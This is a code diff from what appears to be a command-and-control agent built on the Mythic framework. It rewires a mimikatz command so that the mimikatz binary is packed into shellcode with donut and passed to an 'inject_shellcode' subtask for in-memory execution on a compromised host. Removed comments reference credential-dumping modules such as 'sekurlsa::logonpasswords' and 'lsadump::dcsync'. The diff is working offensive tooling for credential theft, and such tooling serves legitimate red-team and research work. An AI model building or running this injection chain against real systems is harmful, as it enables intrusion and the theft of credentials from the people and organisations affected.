@@ -9,6 +9,7 @@ import base64
 from .utils.mythicrpc_utilities import *
 from .utils.bof_utilities import *
 import donut
+from .inject_shellcode import *
 
 logging.basicConfig(level=logging.INFO)
 
@@ -87,6 +88,7 @@ class MimikatCommand(CoffCommandBase):
         dependencies=["inject_shellcode"],
         alias=True
     )
+    
 
     async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
         response = PTTaskCreateTaskingMessageResponse(
@@ -109,10 +111,10 @@ class MimikatCommand(CoffCommandBase):
 
             ######################################
             #                                    #
-            #   Send SubTask to inline_execute   #
+            #   Send SubTask to inject_shellcode #
             #                                    #
             ######################################      
-                  
+
             file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                     TaskID=taskData.Task.ID,
                     Filename="mimikatz.x64.exe",
@@ -137,10 +139,17 @@ class MimikatCommand(CoffCommandBase):
             with os.fdopen(fd, 'wb') as tmp:
                 tmp.write(mimikatz_contents.Content)
 
-            # Bypass=None, ExitOption=exit process
+            # Create shellcode (Bypass=None, ExitOption=exit process)
             mimi_args = taskData.args.get_arg('mimi_arguments')
             full_args = f"privilege::debug {mimi_args} exit"
             mimi_shellcode = donut.create(file=temppath, params=full_args, bypass=1, exit_opt=2)
+            
+            # # Prepend Named Pipe stub (to set stdout/stderr for process)
+            # named_pipe_stub_path = 'xenon/agent_code/stub/stub.bin'
+            # with open(named_pipe_stub_path, 'rb') as f:
+            #     stub_bytes = f.read()
+            # mimi_shellcode = stub_bytes + mimi_shellcode
+            
             # Clean up temp file
             os.remove(temppath)
             
@@ -162,32 +171,20 @@ class MimikatCommand(CoffCommandBase):
             
             # Debugging
             # logging.info(taskData.args.to_json())
-            
-            
-            # From Apollo Agent
-            # executePEArgs = ExecutePEArguments(command_line=json.dumps(
-            #     {
-            #         "pe_name": "mimikatz.exe",
-            #         "pe_arguments": commandline,
-            #     }
-            # ))
-            # await executePEArgs.parse_arguments()
-            # executePECommand = ExecutePECommand(agent_path=self.agent_code_path,
-            #                                     agent_code_path=self.agent_code_path,
-            #                                     agent_browserscript_path=self.agent_browserscript_path)
-            # # set our taskData args to be the new ones for execute_pe
-            # taskData.args = executePEArgs
-            # # executePE's creat_go_tasking function returns a response for us
-            # newResp = await executePECommand.create_go_tasking(taskData=taskData)
-            # # update the response to make sure this gets pulled down as execute_pe instead of mimikatz
-            # newResp.CommandName = "execute_pe"
-            # newResp.DisplayParams = commandline
-            # if "lsadump::dcsync" in commandline or "sekurlsa::logonpasswords" in commandline:
-            #     newResp.CompletionFunctionName = "parse_credentials"
-            # return newResp
-                   
-            #Debugging
-            logging.info(taskData.args.to_json())
+            # Group name 'Existing'
+            subtask = await SendMythicRPCTaskCreateSubtask(
+                MythicRPCTaskCreateSubtaskMessage(
+                    taskData.Task.ID,
+                    CommandName="inject_shellcode",
+                    SubtaskCallbackFunction="coff_completion_callback",
+                    Params=json.dumps({
+                        "shellcode_file": shellcode_file_uuid,
+                        "method": "kit"
+                    }),
+                    Token=taskData.Task.TokenID,
+                )
+            )
+        
             
             return response
 
